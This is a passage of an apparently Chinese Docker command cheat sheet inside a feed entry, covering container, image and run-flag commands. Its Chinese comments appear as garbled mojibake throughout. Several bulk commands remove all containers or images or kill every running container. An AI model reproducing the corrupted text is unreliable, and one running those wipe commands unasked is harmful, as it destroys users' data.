docker create -it --name test daocloud.io/library/ubuntu
# åˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªå®¹å™¨ åä¸º test ä½¿ç”¨é•œåƒdaocloud.io/library/ubuntu
docker run --name test daocloud.io/library/ubuntu
# åˆ é™¤ä¸€ä¸ªå®¹å™¨
docker rm [å®¹å™¨id]
# åˆ é™¤æ‰€æœ‰å®¹å™¨
docker rm `docker ps -a -q`
# æ ¹æ®Dockerfile æ„å»º
docker build -t [image_name] [Dockerfile_path]
</code></pre>
<h3 id="dockerå®¹å™¨éšç³»ç»Ÿè‡ªå¯">dockerå®¹å™¨éšç³»ç»Ÿè‡ªå¯</h3>
<pre><code>docker run --restart=always
</code></pre>
<ul>
<li>no â€“ é»˜è®¤å€¼ï¼Œå¦‚æœå®¹å™¨æŒ‚æ‰ä¸è‡ªåŠ¨é‡å¯</li>
<li>on-failure â€“ å½“å®¹å™¨ä»¥é 0 ç é€€å‡ºæ—¶é‡å¯å®¹å™¨,åŒæ—¶å¯æ¥å—ä¸€ä¸ªå¯é€‰çš„æœ€å¤§é‡å¯æ¬¡æ•°å‚æ•° (e.g. on-failure:10).</li>
<li>always â€“ ä¸ç®¡é€€å‡ºç æ˜¯å¤šå°‘éƒ½è¦é‡å¯</li>
</ul>
<h3 id="å®¹å™¨èµ„æºé™åˆ¶å‚æ•°">å®¹å™¨èµ„æºé™åˆ¶å‚æ•°</h3>
<pre><code># é™åˆ¶å†…å­˜æœ€å¤§ä½¿ç”¨
-m 1024m --memory-swap=1024m
# é™åˆ¶å®¹å™¨ä½¿ç”¨CPU
--cpuset-cpus=&quot;0,1&quot;
</code></pre>
<h3 id="æŠŠä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„å®¹å™¨ä¿å­˜ä¸ºé•œåƒ">æŠŠä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„å®¹å™¨ä¿å­˜ä¸ºé•œåƒ</h3>
<pre><code>docker commit &lt;CONTAIN-ID&gt; &lt;IMAGE-NAME&gt;
</code></pre>
<h3 id="å¯åŠ¨åœæ­¢å®¹å™¨ç­‰æ“ä½œ">å¯åŠ¨åœæ­¢å®¹å™¨ç­‰æ“ä½œ</h3>
<pre><code>docker start|stop|restart [id]
# æš‚åœ|æ¢å¤ æŸä¸€å®¹å™¨çš„æ‰€æœ‰è¿›ç¨‹
docker pause|unpause [id]
# æ€æ­»ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡å®šå®¹å™¨è¿›ç¨‹
docker kill -s KILL [id]
# åœæ­¢å…¨éƒ¨è¿è¡Œçš„å®¹å™¨
docker stop `docker ps -q`
# æ€æ‰å…¨éƒ¨è¿è¡Œçš„å®¹å™¨
docker kill -s KILL `docker ps -q`
</code></pre>
<h3 id="äº¤äº’å¼è¿›å…¥å®¹å™¨">äº¤äº’å¼è¿›å…¥å®¹å™¨</h3>
<pre><code>sudo docker exec -it {{containerName or containerID}} bash
</code></pre>
<h3 id="æŸ¥çœ‹å®¹å™¨çš„rootç”¨æˆ·å¯†ç ">æŸ¥çœ‹å®¹å™¨çš„rootç”¨æˆ·å¯†ç </h3>
<pre><code>docker logs &lt;å®¹å™¨åorID&gt; 2&gt;&amp;1 | grep '^User: ' | tail -n1
</code></pre>
<p>å› ä¸ºDockerå®¹å™¨å¯åŠ¨æ—¶çš„rootç”¨æˆ·çš„å¯†ç æ˜¯éšæœºåˆ†é…çš„ã€‚æ‰€ä»¥ï¼Œé€šè¿‡è¿™ç§æ–¹å¼å°±å¯ä»¥å¾—åˆ°å®¹å™¨çš„rootç”¨æˆ·çš„å¯†ç äº†</p>
<h3 id="å®¹å™¨äºå®¿ä¸»æ‹·è´æ–‡ä»¶">å®¹å™¨äºå®¿ä¸»æ‹·è´æ–‡ä»¶</h3>
<pre><code>docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-
docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH
# æœ¬åœ°æ–‡ä»¶ä¸Šä¼ åˆ°å¯¹åº”å®¹å™¨çš„ç›®å½•
docker cp local.sh [CONTAINERid]:[TagPath]
</code></pre>
<p>æ­¤å‘½ä»¤ä¸ºé«˜ç‰ˆæœ¬dockeræ‰æœ‰ï¼Œå½“ç„¶1.11+è‚¯å®šåŒ…å«</p>
<h3 id="è¿è¡Œä¸€ä¸ªæ–°å®¹å™¨åŒæ—¶ä¸ºå®ƒå‘½å-ç«¯å£æ˜ å°„-æ–‡ä»¶å¤¹æ˜ å°„">è¿è¡Œä¸€ä¸ªæ–°å®¹å™¨ï¼ŒåŒæ—¶ä¸ºå®ƒå‘½åã€ç«¯å£æ˜ å°„ã€æ–‡ä»¶å¤¹æ˜ å°„</h3>
<p>ä»¥<code>redmine</code>é•œåƒä¸ºä¾‹</p>
<pre><code>docker run --name redmine -p 9003:80 -p 9023:22 -d -v /var/redmine/files:/redmine/files -v /var/redmine/mysql:/var/lib/mysql sameersbn/redmine
</code></pre>
<h3 id="ä¸€ä¸ªå®¹å™¨è¿æ¥åˆ°å¦ä¸€ä¸ªå®¹å™¨">ä¸€ä¸ªå®¹å™¨è¿æ¥åˆ°å¦ä¸€ä¸ªå®¹å™¨</h3>
<pre><code>docker run -i -t --name sonar -d -link mmysql:db  tpires/sonar-server sonar
</code></pre>
<h3 id="å¯¼å…¥å¯¼å‡ºå®¹å™¨">å¯¼å…¥å¯¼å‡ºå®¹å™¨</h3>
<pre><code># æ”¯æŒè¿œç¨‹æ–‡ä»¶ .tar, .tar.gz, .tgz, .bzip, .tar.xz, .txz
docker import
# å¯¼å‡º
docker export [id] &gt;~/Downloads/ubuntu_nexus.tar
å¯¼å‡ºåå¯¼å…¥ï¼ˆexported-imported)ï¼‰çš„å®¹å™¨ä¼šä¸¢å¤±æ‰€æœ‰çš„æäº¤å†å²ï¼Œæ— æ³•å›æ»šã€‚
</code></pre>
<h1 id="é•œåƒæ“ä½œ">é•œåƒæ“ä½œ</h1>
<h2 id="è¿œç¨‹é•œåƒ">è¿œç¨‹é•œåƒ</h2>
<pre><code>docker login
</code></pre>
<pre><code>docker search
# æœç´¢å¤„æ”¶è—æ•°ä¸å°äº 3 ï¼Œå¹¶ä¸”èƒ½å¤Ÿè‡ªåŠ¨åŒ–æ„å»ºçš„  django é•œåƒï¼Œå¹¶ä¸”å®Œæ•´æ˜¾ç¤ºé•œåƒæè¿°
docker search -s 3 --automated --no-trunc django
docker pull
# æ‹‰å–ubuntuæœ€æ–°çš„é•œåƒ
docker pull ubuntu:latest
# æœåŠ¡å™¨æ‹‰å–ä¸ªäººåŠ¨æ€ï¼Œå¯é€‰æ‹©æ—¶é—´åŒºé—´
docker events
# æ‹‰å–ä¸ªäººä» 2015/07/20 åˆ° 2015/08/08 çš„ä¸ªäººåŠ¨æ€
docker events --since=&quot;20150720&quot; --until=&quot;20150808&quot;
</code></pre>
<h2 id="é•œåƒåŒæ­¥æ“ä½œ">é•œåƒåŒæ­¥æ“ä½œ</h2>
<pre><code># æ ‡è®°æœ¬åœ°é•œåƒï¼Œå°†å…¶å½’å…¥æŸä¸€ä»“åº“
docker tag
# å°† ID ä¸º 5db5f84x1261 çš„å®¹å™¨æ ‡è®°ä¸º mine/lnmp:0.2 é•œåƒ
docker tag 5db5f84x1261 mine/lnmp:0.2
# å°†é•œåƒæ¨é€è‡³è¿œç¨‹ä»“åº“ï¼Œé»˜è®¤ä¸º Docker Hub
docker push
æœ¬åœ°é•œåƒ

# åˆ—å‡ºæœ¬åœ°æ‰€æœ‰é•œåƒ
docker images
# æœ¬åœ°é•œåƒåä¸º ubuntu çš„æ‰€æœ‰é•œåƒ
docker images ubuntu
# æŸ¥çœ‹æŒ‡å®šé•œåƒçš„åˆ›å»ºå†å²
docker history [id]
# æœ¬åœ°ç§»é™¤ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡å®šçš„é•œåƒ
docker rmi
# ç§»é™¤æœ¬åœ°å…¨éƒ¨é•œåƒ
docker rmi `docker images -a -q`
# æŒ‡å®šé•œåƒä¿å­˜æˆ tar å½’æ¡£æ–‡ä»¶ï¼Œ docker load çš„é€†æ“ä½œ
docker save
# å°†é•œåƒ ubuntu:14.04 ä¿å­˜ä¸º ubuntu14.04.tar æ–‡ä»¶
docker save -o ubuntu14.04.tar ubuntu:14.04
# ä» tar é•œåƒå½’æ¡£ä¸­è½½å…¥é•œåƒï¼Œ docker save çš„é€†æ“ä½œ
docker load
# ä¸Šé¢å‘½ä»¤çš„æ„æ€æ˜¯å°† ubuntu14.04.tar æ–‡ä»¶è½½å…¥é•œåƒä¸­
docker load -i ubuntu14.04.tar
docker load &lt; /home/save.tar
# æ„å»ºè‡ªå·±çš„é•œåƒ
docker build -t &lt;é•œåƒå&gt; &lt;Dockerfileè·¯å¾„&gt;
docker build -t xx/gitlab .
</code></pre>
<blockquote>
<p>ä¿å­˜åå†åŠ è½½ï¼ˆsaved-loadedï¼‰çš„é•œåƒä¸ä¼šä¸¢å¤±æäº¤å†å²å’Œå±‚ï¼Œå¯ä»¥å›æ»š</p>
</blockquote>
<h2 id="é‡æ–°æŸ¥çœ‹containerçš„stdout">é‡æ–°æŸ¥çœ‹containerçš„stdout</h2>
<pre><code># å¯åŠ¨topå‘½ä»¤ï¼Œåå°è¿è¡Œ
$ ID=$(sudo docker run -d ubuntu /usr/bin/top -b)
# è·å–æ­£åœ¨runningçš„containerçš„è¾“å‡º
$ sudo docker attach $ID
top - 02:05:52 up  3:05,  0 users,  load average: 0.01, 0.02, 0.05
Tasks:  1 total,  1 running,  0 sleeping,  0 stopped,  0 zombie
Cpu(s):  0.1%us,  0.2%sy,  0.0%ni, 99.7%id,  0.0%wa,  0.0%hi,  0.0%si,  0.0%st
Mem:    373572k total,  355560k used,    18012k free,    27872k buffers
Swap:  786428k total,        0k used,  786428k free,  221740k cached
^C$
$ sudo docker stop $ID
</code></pre>
<h1 id="docker-run">docker run</h1>
<h2 id="åå°è¿è¡Œ-d-å¹¶æš´éœ²ç«¯å£">åå°è¿è¡Œ(-d)ã€å¹¶æš´éœ²ç«¯å£</h2>
<p>å¦‚æœæƒ³è¦å…¶ä»–ä¸»æœºè®¿é—®,ä¸èƒ½ä½¿ç”¨<code>127.0.0.1</code>éœ€è¦ä½¿ç”¨<code>0.0.0.0</code>ä½œä¸ºipåœ°å€<br>
<code>127.0.0.1</code>ä»…èƒ½ä¸»æœºè®¿é—®,æ˜¯å›ç¯åœ°å€</p>
<pre><code>docker run -d -p 127.0.0.1:33301:22 centos6-ssh
</code></pre>
<h2 id="run-å‘½ä»¤è¯¦è§£">run å‘½ä»¤è¯¦è§£</h2>
<pre><code>-a, --attach=[]            Attach to STDIN, STDOUT or STDERR æŒ‡å®šæ ‡å‡†è¾“å…¥è¾“å‡ºå†…å®¹ç±»å‹ï¼Œå¯é€‰ STDIN/STDOUT/STDERR ä¸‰é¡¹
  --add-host=[]              Add a custom host-to-IP mapping (host:ip)
  --blkio-weight=0            Block IO (relative weight), between 10 and 1000
  -c, --cpu-shares=0          CPU shares (relative weight)
  --cap-add=[]                Add Linux capabilities
  --cap-drop=[]              Drop Linux capabilities
  --cgroup-parent=            Optional parent cgroup for the container
  --cidfile=                  Write the container ID to the file
  --cpu-period=0              Limit CPU CFS (Completely Fair Scheduler) period
  --cpu-quota=0              Limit the CPU CFS quota
  --cpuset-cpus=              CPUs in which to allow execution (0-3, 0,1) ç»‘å®šå®¹å™¨åˆ°æŒ‡å®šCPUè¿è¡Œ
  --cpuset-mems=              MEMs in which to allow execution (0-3, 0,1) ç»‘å®šå®¹å™¨åˆ°æŒ‡å®šMEMè¿è¡Œ
  -d, --detach=false          Run container in background and print container ID åå°è¿è¡Œå®¹å™¨ï¼Œå¹¶è¿”å›å®¹å™¨ID
  --device=[]                Add a host device to the container
  --dns=[]                    Set custom DNS servers æŒ‡å®šå®¹å™¨ä½¿ç”¨çš„DNSæœåŠ¡å™¨ï¼Œé»˜è®¤å’Œå®¿ä¸»ä¸€è‡´
  --dns-search=[]            Set custom DNS search domains æŒ‡å®šå®¹å™¨DNSæœç´¢åŸŸåï¼Œé»˜è®¤å’Œå®¿ä¸»ä¸€è‡´
  -e, --env=[]                Set environment variables è®¾ç½®ç¯å¢ƒå˜é‡
  --entrypoint=              Overwrite the default ENTRYPOINT of the image
  --env-file=[]              Read in a file of environment variables ä»æŒ‡å®šæ–‡ä»¶è¯»å…¥ç¯å¢ƒå˜é‡
  --expose=[]                Expose a port or a range of ports
  -h, --hostname=            Container host name æŒ‡å®šå®¹å™¨çš„hostname
  --help=false                Print usage
  -i, --interactive=false    Keep STDIN open even if not attached ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œé€šå¸¸ä¸ -t åŒæ—¶ä½¿ç”¨
  --ipc=                      IPC namespace to use
  -l, --label=[]              Set meta data on a container
  --label-file=[]            Read in a line delimited file of labels
  --link=[]                  Add link to another container
  --log-driver=              Logging driver for container
  --log-opt=[]                Log driver options
  --lxc-conf=[]              Add custom lxc options
  -m, --memory=              Memory limit
  --mac-address=              Container MAC address (e.g. 92:d0:c6:0a:29:33)
  --memory-swap=              Total memory (memory + swap), '-1' to disable swap
  --name=                    Assign a name to the container ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåç§°
  --net=bridge                Set the Network mode for the container  æŒ‡å®šå®¹å™¨çš„ç½‘ç»œè¿æ¥ç±»å‹ï¼Œæ”¯æŒ bridge/host/none/container:&lt;name|id&gt; å››ç§ç±»å‹
  --oom-kill-disable=false    Disable OOM Killer
  -P, --publish-all=false    Publish all exposed ports to random ports
  -p, --publish=[]            Publish a container's port(s) to the host
  --pid=                      PID namespace to use
  --privileged=false          Give extended privileges to this container
  --read-only=false          Mount the container's root filesystem as read only
  --restart=no                Restart policy to apply when a container exits
  --rm=false                  Automatically remove the container when it exits
  --security-opt=[]          Security Options
  --sig-proxy=true            Proxy received signals to the process
  -t, --tty=false            Allocate a pseudo-TTY ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸ -i åŒæ—¶ä½¿ç”¨
  -u, --user=                Username or UID (format: &lt;name|uid&gt;[:&lt;group|gid&gt;])
  --ulimit=[]                Ulimit options
  --uts=                      UTS namespace to use
  -v, --volume=[]            Bind mount a volume
  --volumes-from=[]          Mount volumes from the specified container(s)
  -w, --workdir=              Working directory inside the container
</code></pre>
<h1 id="å­˜åœ¨çš„é—®é¢˜è§£å†³æ–¹æ³•">å­˜åœ¨çš„é—®é¢˜è§£å†³æ–¹æ³•</h1>
<h2 id="ubuntu14ä¸‹çš„dockeræ˜¯æ²¡æœ‰serviceæœåŠ¡">ubuntu14ä¸‹çš„dockeræ˜¯æ²¡æœ‰serviceæœåŠ¡</h2>
<p>å»é™¤æ¯æ¬¡sudoè¿è¡Œdockerå‘½ä»¤ï¼Œéœ€è¦æ·»åŠ ç»„</p>
<pre><code># Add the docker group if it doesn't already exist.
$ sudo groupadd docker
#æ”¹å®Œåéœ€è¦é‡æ–°ç™»é™†ç”¨æˆ·
$ sudo gpasswd -a ${USER} docker
</code></pre>
<h2 id="dockerfileä¸­çš„expose-docker-run-expose-docker-run-pä¹‹é—´çš„åŒºåˆ«">Dockerfileä¸­çš„EXPOSEã€docker run --exposeã€docker run -pä¹‹é—´çš„åŒºåˆ«</h2>
<ul>
<li>Dockerfileçš„EXPOSEç›¸å½“äºdocker run --exposeï¼Œæä¾›containerä¹‹é—´çš„ç«¯å£è®¿é—®</li>
<li>docker run -på…è®¸containerå¤–éƒ¨ä¸»æœºè®¿é—®containerçš„ç«¯å£</li>
</ul>
<h2 id="ubuntu14çš„febootstrapæ²¡æœ‰-iå‘½ä»¤">ubuntu14çš„febootstrapæ²¡æœ‰-iå‘½ä»¤</h2>
<p>ä½œè€…ï¼šæ³›åŸç½ª<br>
é“¾æ¥ï¼š<a href="http://www.jianshu.com/p/adaa34795e64">http://www.jianshu.com/p/adaa34795e64</a><br>
ä¾†æºï¼šç®€ä¹¦</p>
]]></content>
    </entry>
</feed>